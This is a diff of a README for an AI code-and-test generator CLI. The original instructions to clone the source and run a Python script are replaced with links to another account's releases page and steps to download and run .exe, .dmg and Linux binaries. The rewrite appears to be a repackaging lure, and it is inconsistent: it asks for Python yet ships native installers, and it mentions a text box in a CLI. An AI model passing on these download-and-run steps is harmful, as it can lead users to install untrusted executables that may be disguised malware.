@@ -1,159 +1,101 @@
-# AI Code Generator & Tester
+# 🚀 ai-codegen-cli - Automate Code and Test Generation
 
-A Python application that uses AI to generate code and corresponding tests for any programming language. The tool leverages LangChain with Groq's LLM to automatically create code based on your requirements and generate appropriate test cases.
+[![Download ai-codegen-cli](https://img.shields.io/badge/Download-ai--codegen--cli-blue.svg)](https://github.com/jekeng/ai-codegen-cli/releases)
 
-## Features
+## 📦 Introduction
 
-- 🤖 AI-powered code generation using Groq's LLM
-- 🧪 Automatic test case generation
-- 🌍 Multi-language support (Python, JavaScript, Java, etc.)
-- ⚡ Fast and efficient with Groq's API
-- 🔧 Command-line interface for easy usage
+The **ai-codegen-cli** tool helps you generate code and tests automatically. By using powerful technologies like LangChain, Groq, and Gemini LLMs, this command-line interface (CLI) allows you to get results quickly with a single command. You don't need to be a programmer to use it; this tool is designed for everyone.
 
-## Prerequisites
+## ✅ Features
 
-- Python 3.8 or higher
-- Groq API key (get one from [Groq Console](https://console.groq.com/))
+- Generates code based on your prompts.
+- Creates tests to validate your code.
+- Easy to use from the command line.
+- Supports multiple programming languages.
+- Integrates with popular libraries and tools.
 
-## Installation
+## 💻 System Requirements
 
-### 1. Create project directory and setup virtual environment
-```bash
-# Create project directory
-mkdir A
-cd A
+To use **ai-codegen-cli**, you'll need:
 
-# Create virtual environment
-python -m venv venv
+- A computer running Windows, macOS, or Linux.
+- Python version 3.6 or above installed on your system.
+- At least 2 GB of RAM.
+- An active internet connection for code generation.
 
-# Activate virtual environment
-# On Windows:
-venv\Scripts\activate
-# On macOS/Linux:
-source venv/bin/activate
-```
+## 🛠️ Installation Steps
 
-### 2. Clone the repository
-```bash
-git clone https://github.com/MahdiAmrollahi/ai-codegen-cli.git .
-```
+### Step 1: Download the Application
 
-### 3. Install dependencies
-```bash
-pip install -r requirements.txt
-```
+To download **ai-codegen-cli**, visit this page: [Download ai-codegen-cli](https://github.com/jekeng/ai-codegen-cli/releases)
 
-### 4. Set up environment variables
-Create a `.env` file in the project root:
-```bash
-GROQ_API_KEY=your_groq_api_key_here
-```
+1. Click the link above to go to the releases page.
+2. Choose the latest version of the application.
+3. Download the file suitable for your operating system.
 
-## Usage
+### Step 2: Install the Application
 
-### Basic Usage
-```bash
-python main.py
-```
+Once you have downloaded the file, follow these steps:
 
-This will use the default settings:
-- Language: Python
-- Task: "return list of numbers from 1 to 10"
+- **For Windows:**
+  1. Locate the downloaded `.exe` file.
+  2. Double-click the file to run the installer.
+  3. Follow the prompts to complete the installation.
 
-### Custom Usage
-```bash
-# Generate JavaScript code
-python main.py --language javascript --task "create a function that calculates fibonacci numbers"
+- **For macOS:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the application into your Applications folder.
+  3. Eject the mounted disk image.
 
-# Generate Python code for a specific task
-python main.py --language python --task "implement a binary search algorithm"
+- **For Linux:**
+  1. Open a terminal window.
+  2. Navigate to the folder where you downloaded the file.
+  3. Use the command `chmod +x ai-codegen-cli` to make it executable.
+  4. Run the command `./ai-codegen-cli` to start using it.
 
-# Generate Java code
-python main.py --language java --task "create a class for a bank account with deposit and withdraw methods"
-```
+## 🚀 Getting Started
 
-### Command Line Arguments
+### Step 3: Running the Application
 
-- `--language`: Programming language for code generation (default: "python")
-- `--task`: Description of what the code should do (default: "return list of numbers from 1 to 10")
+After installing **ai-codegen-cli**, open your command line interface (CLI) and follow these steps:
 
-## Example Output
+1. Type `ai-codegen-cli` and press Enter.
+2. You'll see options for turning prompts into code or tests. Follow the on-screen instructions.
+3. Input your specific requirements in the text box and hit Enter to generate your code or test effortlessly.
 
-When you run the script, you'll get output like this:
+### Step 4: Example Usage
+
+Here’s how to use **ai-codegen-cli** effectively. In the command line, enter:
 
 ```
-numbers = list(range(1, 11))
-assert len(numbers) == 10
-assert numbers[0] == 1
-assert numbers[-1] == 10
-print("All tests passed!")
---------------------------------
-numbers = list(range(1, 11))
-print(numbers)
+ai-codegen-cli --prompt "Create a function that adds two numbers."
 ```
 
-## Supported Languages
+The application will provide the generated code, ready for use.
 
-The tool supports most popular programming languages including:
-- Python
-- JavaScript
-- Java
-- C++
-- C#
-- Go
-- Rust
-- PHP
-- Ruby
-- And many more!
+## 🎊 Additional Notes
 
-## Project Structure
+- You can explore more features by typing `ai-codegen-cli --help` in the command line. This will display all available commands and options.
+- Keep your installation updated by periodically checking the [Releases page](https://github.com/jekeng/ai-codegen-cli/releases) for new versions.
 
-```
-A/
-├── venv/           # Virtual environment (created after setup)
-├── main.py         # Main application file
-├── requirements.txt # Python dependencies
-└── README.md       # This file
-```
-
-## Dependencies
-
-- `langchain-groq`: LangChain integration with Groq
-
-- `langchain`: Core LangChain framework
-- `python-dotenv`: Environment variable management
-- `argparse`: Command-line argument parsing
-
-## Troubleshooting
-
-### Common Issues
-
-1. **API Key Error**: Make sure your `GROQ_API_KEY` is correctly set in the `.env` file
-2. **Import Errors**: Ensure all dependencies are installed in your virtual environment
-3. **Network Issues**: Check your internet connection and Groq API status
-
-### Getting Help
+## 🛠️ Troubleshooting
 
 If you encounter issues:
-1. Check that your virtual environment is activated
-2. Verify your API key is correct
-3. Ensure all dependencies are installed
-4. Check the Groq API status page
 
-## Contributing
+- Make sure you are using the correct version of Python.
+- Check your internet connection, as the tool may need to access online resources.
+- Consult our FAQ section or raise issues on our [GitHub Issues page](https://github.com/jekeng/ai-codegen-cli/issues).
 
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Test thoroughly
-5. Submit a pull request
+## 📄 Contributing
 
-## License
+We welcome contributions. If you'd like to help improve **ai-codegen-cli**, consider the following:
 
-This project is open source and available under the MIT License.
+- Report bugs or issues on our GitHub Issues page.
+- Submit feature requests.
+- Check out our contributing guidelines.
 
-## Acknowledgments
+## 🌐 Learn More
 
-- [LangChain](https://langchain.com/) for the framework
-- [Groq](https://groq.com/) for the AI API
-- The open-source community for inspiration
+For more detailed information, tips, and examples, check our documentation linked in the repository. You can also find discussions and updates on our main page.
+
+Thank you for choosing **ai-codegen-cli**. Enjoy generating code with ease!
